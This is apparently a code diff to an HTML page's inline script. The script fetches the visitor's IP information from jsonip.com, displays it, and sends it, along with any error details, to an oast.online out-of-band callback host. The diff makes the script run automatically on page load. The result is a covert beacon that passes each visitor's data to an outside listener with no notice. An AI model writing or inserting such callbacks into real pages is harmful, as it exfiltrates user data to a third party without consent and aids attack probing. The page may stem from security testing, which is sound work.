@@ -5,26 +5,38 @@
   <div id="result1"></div>
   
   <script>
-     async function getData() {
-       
-      const url = "https://jsonip.com";
-       
-      try {
+  async function getData() {
+    const url = "https://jsonip.com";
+    const oast = "https://d9sootamruoqnj2f3itg49dcubiikbc3u.oast.online/";
+
+    try {
         const response = await fetch(url);
+
         if (!response.ok) {
-          throw new Error(`Response status: ${response.status}`);
+            throw new Error(`HTTP ${response.status}`);
         }
-        
+
         const result = await response.json();
-         document.getElementById("result").innerHTML = result;
-        fetch(`https://d9sootamruoqnj2f3itg49dcubiikbc3u.oast.online/?q=${result}`)
-      } 
-      catch (error) {
-         document.getElementById("result").innerHTML = error;
-         fetch(`https://d9sootamruoqnj2f3itg49dcubiikbc3u.oast.online/?q=${error}`)
-      }
-     }
-   
+
+        document.getElementById("result").textContent =
+            JSON.stringify(result, null, 2);
+
+        await fetch(`${oast}?q=${encodeURIComponent(JSON.stringify(result))}`);
+
+    } catch (error) {
+        const errorInfo = {
+            name: error?.name,
+            message: error?.message
+        };
+
+        document.getElementById("result").textContent =
+            JSON.stringify(errorInfo, null, 2);
+
+        await fetch(`${oast}?q=${encodeURIComponent(JSON.stringify(errorInfo))}`);
+    }
+}
+
+getData();
   </script>
 
     
